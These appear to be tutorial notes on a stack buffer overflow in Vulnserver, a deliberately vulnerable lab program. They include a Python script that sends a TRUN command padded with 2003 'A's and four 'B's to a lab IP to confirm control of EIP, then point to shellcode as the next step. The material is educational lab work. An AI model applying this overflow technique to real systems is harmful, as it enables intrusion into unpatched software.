- So now we are going to try to overwrite the EIP
- So in the previous section we discovered that the offset itself is 2003 bytes.
- This means that that there's 2003 bytes before you get to EIP and the EIP itself is 4 bytes long.
- Now get your vulnserver and immunity debugger running and create fuzz3.py 

	```
	#!/usr/bin/python3
	import sys, socket
	shellcode = "A"*2003 + "B"*4
	
	
	try:
	        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	        s.connect(('172.18.176.193',9999))
			payload= "TRUN /.:/" + shellcode
	        s.send((payload.encode()))
	        s.close()
	
	except:
	        print ("error Connecing to server")
	        sys.exit()
```
```

- Now here we're sending 2003 A's because that's where your EIP starts. So by 2004 starts EIP.
- We're sending a bunch of A's, but we don't want to overwrite the EIP with A's and we have no idea if we're correct or not.
- So A's hexcode is '41' and B's is '42'.
- So in theory we should be seeing a bunch of 424242.
- So let's run this against vulnserver and check it out.
- This should break the program and show access violation.
- So what happened here, EAX - Trun ran through, EBP - 41414141 came through, but EIP is 42424242. This means we control EIP now.
- Now all we got to do is some housekeeping and find some bad characters and generate shellcode to get root access.
